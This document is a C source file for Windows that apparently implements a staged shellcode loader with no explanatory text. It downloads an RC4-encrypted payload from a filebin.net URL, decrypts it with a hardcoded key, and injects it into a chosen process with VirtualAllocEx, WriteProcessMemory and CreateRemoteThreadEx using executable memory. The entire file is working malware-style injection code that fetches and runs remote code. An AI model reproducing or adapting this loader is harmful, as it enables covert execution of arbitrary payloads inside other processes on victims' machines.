#include <Windows.h>
#include <wininet.h>
#include <stdio.h>
#include "debug.h"
#include "rc4.h"

unsigned char key[] = "mysecretkey12345";

int main(int argc, char* argv[]) {
    DWORD dwPID;
    DWORD dwBytesRead = 0;
    HANDLE hProcess = NULL, hThread = NULL;
    LPCWSTR sourceURL = L"https://filebin.net/9tvhx1mfxu87m5tx/calc.bin";
    PBYTE pBytes = NULL, pTmpBytes = NULL;
    SIZE_T sSize = 0;
    LPVOID rBuffer = NULL;
    HINTERNET hInet, hURL = NULL;
    unsigned int keylen;
    keylen = strlen((const char*)key);

    if (argc < 2) {
        LOG_ERROR("Not enough arguments!");
        return 1;
    }

    dwPID = atoi(argv[1]);
    LOG_INFO("Attempting to open a handle to the provided process (%ld)\n", dwPID);

    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwPID);

    if (hProcess == NULL) {
        LOG_ERROR("Could not open a handle to the provided process, error: %ld", GetLastError());
        return 1;
    }

    LOG_SUCCESS("Successfully opened a handle to the provided process.\n\\---0x%p", hProcess);

    hInet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    if (hInet == NULL) {
        LOG_ERROR("Could not open a handle to hInet... Error: %ld", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    LOG_SUCCESS("Successfully opened a handle to WinInet\n");

    LOG_INFO("Attempting to open a handle to the payload stage\n");
    hURL = InternetOpenUrlW(hInet, sourceURL, NULL, 0, INTERNET_FLAG_HYPERLINK, 0);

    if (hURL == NULL) {
        LOG_ERROR("Could not open a handle to payload stage\n");
        InternetCloseHandle(hInet);
        CloseHandle(hProcess);
        return 1;
    }

    // Allocate 1024 bytes to a temporary buffer
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

    if (pTmpBytes == NULL) {
        LOG_ERROR("Failed to allocate memory for temp buffer");
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInet);
        CloseHandle(hProcess);
        return 1;
    }

    LOG_SUCCESS("Successfully allocated memory to temp buffer!\n\\---0x%p", pTmpBytes);

    // Read data
    while (TRUE) {
        if (!InternetReadFile(hURL, pTmpBytes, 1024, &dwBytesRead)) {
            LOG_ERROR("Could not read contents of specified file... Error: %ld", GetLastError());
            LocalFree(pTmpBytes);
            InternetCloseHandle(hURL);
            InternetCloseHandle(hInet);
            CloseHandle(hProcess);
            return 1;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL) {
            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
        }
        else {
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            LOG_ERROR("Failed to allocate memory for final buffer");
            LocalFree(pTmpBytes);
            InternetCloseHandle(hURL);
            InternetCloseHandle(hInet);
            CloseHandle(hProcess);
            return 1;
        }

        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

    LOG_SUCCESS("Successfully downloaded the payload\n");

    // Decrypt the downloaded payload
    LOG_INFO("Decrypting downloaded payload\n");
    rc4(key, keylen, pBytes, sSize);

    LOG_INFO("Attempting to allocate memory in the specified process' memory range\n");
    rBuffer = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (rBuffer == NULL) {
        LOG_ERROR("Could not allocate memory within the range of the specified process, error: %ld", GetLastError());
        LocalFree(pBytes);
        LocalFree(pTmpBytes);
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInet);
        CloseHandle(hProcess);
        return 1;
    }

    LOG_SUCCESS("Successfully reserved and committed %zu-bytes of memory in the specified process' memory range\n", sSize);

    // Write the decrypted payload to the memory of the specified process
    if (!WriteProcessMemory(hProcess, rBuffer, pBytes, sSize, NULL)) {
        LOG_ERROR("Failed to write decrypted payload to specified buffer, error: %ld", GetLastError());
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        LocalFree(pBytes);
        LocalFree(pTmpBytes);
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInet);
        CloseHandle(hProcess);
        return 1;
    }

    LOG_SUCCESS("Successfully wrote decrypted payload to specified buffer\n");

    LOG_INFO("Creating thread\n");
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL, NULL);

    if (hThread == NULL) {
        LOG_ERROR("Could not create thread, error: %ld", GetLastError());
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        LocalFree(pBytes);
        LocalFree(pTmpBytes);
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInet);
        CloseHandle(hProcess);
        return 1;
    }

    LOG_SUCCESS("Successfully created thread in the target process\n");

    // Cleanup
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
    LocalFree(pBytes);
    LocalFree(pTmpBytes);
    InternetCloseHandle(hURL);
    InternetCloseHandle(hInet);
    CloseHandle(hProcess);

    return 0;
}